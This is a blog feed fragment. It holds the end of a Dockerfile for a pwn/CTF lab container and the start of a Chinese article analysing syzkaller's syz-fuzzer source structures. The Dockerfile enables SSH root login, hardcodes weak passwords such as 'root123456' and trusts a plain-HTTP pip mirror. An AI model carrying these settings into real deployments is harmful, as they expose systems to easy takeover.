class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:root123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这一日，Docker 再入桌面 GUI 境界&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
    <category term="GUI" scheme="https://arttnba3.github.io/tags/GUI/"/>
    
    <category term="Wayland" scheme="https://arttnba3.github.io/tags/Wayland/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x03】syzkaller - III：syz-fuzzer 源码分析</title>
    <link href="https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/"/>
    <id>https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/</id>
    <published>2023-09-26T15:26:14.000Z</published>
    <updated>2023-12-30T09:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>（摘下眼镜）Furry？（戴上眼镜）Fuzzer！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/">上一篇文章</a>当中我们分析了 syzkaller 三大组件当中的 syz-manager 的源码，本篇文章我们继续来分析 syz-fuzzer 的源码</p><p>与 syz-manager 所不同的是，syz-fuzzer 位于 Guest VM 当中，<strong>本质上涵盖了一个传统 fuzzer 的所有基本功能</strong>：输入生成与变异、启动新进程（syz-executor）执行输入、获取覆盖率信息…</p><p>在 syz-fuzzer 运行过程中其会通过 RPC 调用 syz-manager 中的部分函数，因此本篇也会分析上篇所未涉及到的 syz-manager 中的一些函数：）</p><blockquote><p>这一系列文章确实鸽了挺久了，但最近确实是比较忙没啥时间写博客（这一篇其实之前大致的初稿就写好了，但是后面又鸽掉了…），不知道下一篇会是什么时候了 XD</p></blockquote><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始一头雾水地分析源码，笔者认为还是有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="Fuzzing-过程相关"><a href="#Fuzzing-过程相关" class="headerlink" title="Fuzzing 过程相关"></a>Fuzzing 过程相关</h2><h3 id="1-Syscall：单个系统调用的基本信息"><a href="#1-Syscall：单个系统调用的基本信息" class="headerlink" title="1. Syscall：单个系统调用的基本信息"></a>1. Syscall：单个系统调用的基本信息</h3><p>syzkaller <strong>以系统调用为基本输入单位</strong>，定义于 <code>prog/types.go</code> 中的 <code>Syscall</code> 结构体被用来表示单个系统调用的基本信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Syscall <span class="hljs-keyword">struct</span> &#123;<br>ID          <span class="hljs-type">int</span><br>NR          <span class="hljs-type">uint64</span> <span class="hljs-comment">// kernel syscall number</span><br>Name        <span class="hljs-type">string</span><br>CallName    <span class="hljs-type">string</span><br>MissingArgs <span class="hljs-type">int</span> <span class="hljs-comment">// number of trailing args that should be zero-filled</span><br>Args        []Field<br>Ret         Type<br>Attrs       SyscallAttrs<br><br>inputResources  []*ResourceDesc<br>outputResources []*ResourceDesc<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们编写 syzlang 文件时，我们可以为系统调用<a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#call-attributes">添加一些属性</a>，这被封装于内嵌在 <code>Syscall</code> 里的 <code>SyscallAttrs</code> 结构体中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SyscallAttrs 表示 syzlang 的调用属性.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 该结构为系统所有其他部分的 source of truth.</span><br><span class="hljs-comment">// pkg/compiler 使用该结构对描述进行语法分析.</span><br><span class="hljs-comment">// syz-sysgen 使用该结构为 executor 生成代码.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 目前仅支持 `bool`s 与 `uint64`s.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 对于独立属性的描述，参见 docs/syscall_descriptions_syntax.md </span><br><span class="hljs-keyword">type</span> SyscallAttrs <span class="hljs-keyword">struct</span> &#123;<br>Disabled      <span class="hljs-type">bool</span><br>Timeout       <span class="hljs-type">uint64</span><br>ProgTimeout   <span class="hljs-type">uint64</span><br>IgnoreReturn  <span class="hljs-type">bool</span><br>BreaksReturns <span class="hljs-type">bool</span><br>NoGenerate    <span class="hljs-type">bool</span><br>NoMinimize    <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChoiceTable：系统调用生成优先级表"><a href="#2-ChoiceTable：系统调用生成优先级表" class="headerlink" title="2. ChoiceTable：系统调用生成优先级表"></a>2. ChoiceTable：系统调用生成优先级表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>ChoiceTable</code> 是 syz-fuzzer 中非常核心的一个结构，其用于表示<strong>对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ChooseTable（译注：原文如此）允许对给定的一个系统调用，</span><br><span class="hljs-comment">// 对一个系统调用进行一次权重选择，这基于调用到调用的优先级与开启&amp;可生成的系统调用集合</span><br><span class="hljs-keyword">type</span> ChoiceTable <span class="hljs-keyword">struct</span> &#123;<br>target          *Target<span class="hljs-comment">/* 目标架构信息 */</span><br>runs            [][]<span class="hljs-type">int32</span> <span class="hljs-comment">/* 优先级表 */</span><br>calls           []*Syscall <span class="hljs-comment">/* 系统调用信息 */</span><br>noGenerateCalls <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>  <span class="hljs-comment">/* 不用于输入生成的系统调用号 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优先级权重值存放在二维数组 <code>run</code> 中，需要注意的是这个优先级为<strong>累加值</strong>，例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道 ：(</p><h3 id="3-weights：权重"><a href="#3-weights：权重" class="headerlink" title="3. weights：权重"></a>3. weights：权重</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>weights</code> 结构体用于表示【目标系统调用的权重】：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> weights <span class="hljs-keyword">struct</span> &#123;<br>call  <span class="hljs-type">int</span> <span class="hljs-comment">/* 系统调用号 */</span><br>in    <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输入的权重值？ */</span><br>inout <span class="hljs-type">int32</span>  <span class="hljs-comment">/* 以该系统调用作为输出的权重值？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Call：用作输入的单个系统调用"><a href="#4-Call：用作输入的单个系统调用" class="headerlink" title="4. Call：用作输入的单个系统调用"></a>4. Call：用作输入的单个系统调用</h3><p>syzkaller 的 fuzzing 以 syscall 为单位，<code>Syscall</code> 结构体用于表示单个系统调用的基本信息，<code>Call</code> 结构体则表示<strong>带有参数的一个系统调用</strong>，是 syzkaller 中所谓的最小输入单位</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Call <span class="hljs-keyword">struct</span> &#123;<br>Meta    *Syscall<br>Args    []Arg<br>Ret     *ResultArg<br>Props   CallProps<br>Comment <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ArgCtx：带上下文的参数"><a href="#5-ArgCtx：带上下文的参数" class="headerlink" title="5. ArgCtx：带上下文的参数"></a>5. ArgCtx：带上下文的参数</h3><p>系统调用的参数用 <code>Arg</code> 接口表示， <code>ArgCtx</code> 为实现了该接口的带有上下文的一个参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ArgCtx <span class="hljs-keyword">struct</span> &#123;<br>Parent *[]Arg      <span class="hljs-comment">// GroupArg.Inner (for structs) or Call.Args containing this arg.</span><br>Fields []Field     <span class="hljs-comment">// Fields of the parent struct/syscall.</span><br>Base   *PointerArg <span class="hljs-comment">// Pointer to the base of the heap object containing this arg.</span><br>Offset <span class="hljs-type">uint64</span>      <span class="hljs-comment">// Offset of this arg from the base.</span><br>Stop   <span class="hljs-type">bool</span>        <span class="hljs-comment">// If set by the callback, subargs of this arg are not visited.</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Prog：单个输入程序"><a href="#6-Prog：单个输入程序" class="headerlink" title="6. Prog：单个输入程序"></a>6. Prog：单个输入程序</h3><p>通常情况下我们并不仅以一个系统调用作为输入，而是以<strong>一组系统调用序列</strong>作为输入单位——即一个<strong>程序</strong>，这也是 syzkaller 中<strong>实质上的最小输入单位</strong>，在 syz-fuzzer 当中使用 <code>Prog</code> 结构体来表示<strong>单个输入</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Prog <span class="hljs-keyword">struct</span> &#123;<br>Target   *Target <span class="hljs-comment">/* 目标架构信息 */</span><br>Calls    []*Call <span class="hljs-comment">/* 系统调用序列 */</span><br>Comments []<span class="hljs-type">string</span>  <span class="hljs-comment">/* 注释？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Candidate：序列化的单个输入项"><a href="#6-Candidate：序列化的单个输入项" class="headerlink" title="6. Candidate：序列化的单个输入项"></a>6. Candidate：序列化的单个输入项</h3><p>我们通常会有多个 syz-fuzzer 进程与 VM，而我们更希望<strong>在 fuzzer 之间共享那些有用的输入</strong>，这通常通过 <code>syz-fuzzer</code> 向 <code>syz-manager</code> 发起 RPC <code>poll()</code> 来完成——<code>candidate</code> 用以表示<strong>序列化后的输入</strong>，从而方便在不同 进程间传递：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Candidate <span class="hljs-keyword">struct</span> &#123;<br>Prog      []<span class="hljs-type">byte</span><span class="hljs-comment">/* 序列化后的程序 */</span><br>Minimized <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否最小化？ */</span><br>Smashed   <span class="hljs-type">bool</span><span class="hljs-comment">/* 是否要打碎重组？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-CallInfo：单个系统调用的运行结果"><a href="#7-CallInfo：单个系统调用的运行结果" class="headerlink" title="7. CallInfo：单个系统调用的运行结果"></a>7. CallInfo：单个系统调用的运行结果</h3><p>执行完程序之后我们自然想要知道程序的执行结果，在 syz-fuzzer 当中使用 <code>CallInfo</code> 结构体表示<strong>单个系统调用的执行结果</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> CallInfo <span class="hljs-keyword">struct</span> &#123;<br>Flags  CallFlags<br>Signal []<span class="hljs-type">uint32</span> <span class="hljs-comment">// 反馈信号, 若设置了 FlagSignal 则填充</span><br>Cover  []<span class="hljs-type">uint32</span> <span class="hljs-comment">// 每个系统调用的覆盖率, 若设置了 FlagSignal 且 cover == true 则填充,</span><br><span class="hljs-comment">// if dedup == false, 则 cov 实际上包含了一个 trace, 否则重复项被删除</span><br>Comps prog.CompMap <span class="hljs-comment">// 每个系统调用的比较操作数</span><br>Errno <span class="hljs-type">int</span>          <span class="hljs-comment">// 调用的 errno (若调用成功则为 0)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>CompMap</code> 为一个二重映射 <code>uint64 → 【uint64 → bool】</code> ，我们将在后文解释这个东西：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Example: for comparisons &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// this map will store the following:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><h3 id="8-ProgInfo：单个程序的运行结果"><a href="#8-ProgInfo：单个程序的运行结果" class="headerlink" title="8. ProgInfo：单个程序的运行结果"></a>8. ProgInfo：单个程序的运行结果</h3><p>syzkaller 中单次运行的最小粒度其实是由一组系统调用构成的一个程序，因此程序的运行结果很自然地就是由一组 <code>CallInfo</code> 构成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ProgInfo <span class="hljs-keyword">struct</span> &#123;<br>Calls []CallInfo<br>Extra CallInfo <span class="hljs-comment">// stores Signal and Cover collected from background threads</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-Env：syz-executor-的执行环境信息"><a href="#9-Env：syz-executor-的执行环境信息" class="headerlink" title="9. Env：syz-executor 的执行环境信息"></a>9. Env：syz-executor 的执行环境信息</h3><p> <code>Env</code> 结构体用来记录 syz-executor 的执行环境信息，如输入、输出、执行的命令行等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-WorkTriage-WorkCandidate-WorkSmash-：实际的单个输入项"><a href="#10-WorkTriage-WorkCandidate-WorkSmash-：实际的单个输入项" class="headerlink" title="10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项"></a>10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash ：实际的单个输入项</h3><p>在 fuzzing 过程当中 我们实际上不直接以 raw 的 <code>Prog</code> 作为输入，我们还想要在输入上标识更多额外的信息——因此便需要加上一层 wrapper，一共有如下<strong>三种类型</strong>：</p><ul><li><code>WorkTriage</code>：可能提供新的覆盖率的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkTriage 为我们在初次执行时所注意到的潜在新覆盖的程序.</span><br><span class="hljs-comment">// 但我们并不能确定是否这是真实的覆盖率.</span><br><span class="hljs-comment">// 在分类中我们明白了这些程序是否真的给出了新的覆盖率，</span><br><span class="hljs-comment">// 若是，则将其最小化并添加到语料库中.</span><br><span class="hljs-keyword">type</span> WorkTriage <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call  <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>info  ipc.CallInfo<span class="hljs-comment">/* 运行结果 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkCandidate</code>：由 hub（也就是 syz-manager）传来的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkCandidate 为来自 hub 的程序.</span><br><span class="hljs-comment">// 我们暂不知道她们对当前 fuzzer 是否有用.</span><br><span class="hljs-comment">// 进程以对本地生成/变异程序相同的方式处理她们.</span><br><span class="hljs-keyword">type</span> WorkCandidate <span class="hljs-keyword">struct</span> &#123;<br>p     *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>flags ProgTypes<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>WorkSmash</code>：刚刚被加入到语料库中的程序</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// WorkSmash 为刚刚添加到语料库中的程序.</span><br><span class="hljs-comment">// 在 smashing 过程中这些程序将收到一次特别的关注</span><br><span class="hljs-comment">// (emit faults, collect comparison hints, etc).</span><br><span class="hljs-keyword">type</span> WorkSmash <span class="hljs-keyword">struct</span> &#123;<br>p    *prog.Prog<span class="hljs-comment">/* 系统调用序列 */</span><br>call <span class="hljs-type">int</span><span class="hljs-comment">/* interesting 的系统调用号？ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="11-Cover：覆盖率信息"><a href="#11-Cover：覆盖率信息" class="headerlink" title="11. Cover：覆盖率信息"></a>11. Cover：覆盖率信息</h3><p>主流的 fuzzer 都是基于覆盖率指导的，syzkaller 也不例外，在 syz-fuzzer 中使用 <code>Cover</code> 结构体表示覆盖率信息：</p><blockquote><p> 没有注释所以笔者也没太看明白是怎么个意思：( </p><p>目前推测 key 是 program counter，val 目前无实际意义只是用来占位表示覆盖到了该地址</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Cover <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="输入生成变异相关"><a href="#输入生成变异相关" class="headerlink" title="输入生成变异相关"></a>输入生成变异相关</h2><h3 id="0-hint-机制"><a href="#0-hint-机制" class="headerlink" title="0. hint 机制"></a>0. hint 机制</h3><p>我们首先来看 syz-executor 中一个重要的变异机制——<code>mutate with hint</code> （可以理解为 hint 辅助的变异），在 <code>hint.go</code> 开头有如下注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 一个 hint 大体而言为一个由指向一个程序中一个系统调用的一个参数的指针</span><br><span class="hljs-comment">// 与一个应当被赋给该参数的值（我们称之为 replacer）组成.</span><br><span class="hljs-comment">//（译注：什么B长难句）</span><br><br><span class="hljs-comment">// 一个简易版本的 hints workflow 形如:</span><br><span class="hljs-comment">//1. Fuzzer 启动一个程序 (称之为 hint 种子) 并为程序中的每个系统调用</span><br><span class="hljs-comment">// 收集所有的比较数据.</span><br><span class="hljs-comment">//2. 接下来其尝试将所获得的比较操作数的值于输入参数值进行匹配.</span><br><span class="hljs-comment">//3. 对于每一个这样的匹配，fuzzer 通过将指向的参数使用保存的值进行替换来变异程序.</span><br><span class="hljs-comment">//4. 若获得了一个合法的程序, fuzzer 将其启动并检查是否获得了新的覆盖率.</span><br><span class="hljs-comment">// 要了解更多关于特定突变的信息，参见 prog/hints_test.go.</span><br></code></pre></td></tr></table></figure><h3 id="1-CompMap：用作比较的参数的收缩-扩展替换取值表【核心】"><a href="#1-CompMap：用作比较的参数的收缩-扩展替换取值表【核心】" class="headerlink" title="1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】"></a>1.CompMap：用作比较的参数的收缩&#x2F;扩展替换取值表【核心】</h3><p>CompMap 为一个 <code>uint64 </code>到 <code>[uint64 到 bool 的映射]</code> 的映射，用来在<strong>输入变异的时候进行参数值的替换</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 🌰: 对于比较对 &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// 该映射将存储如下:</span><br><span 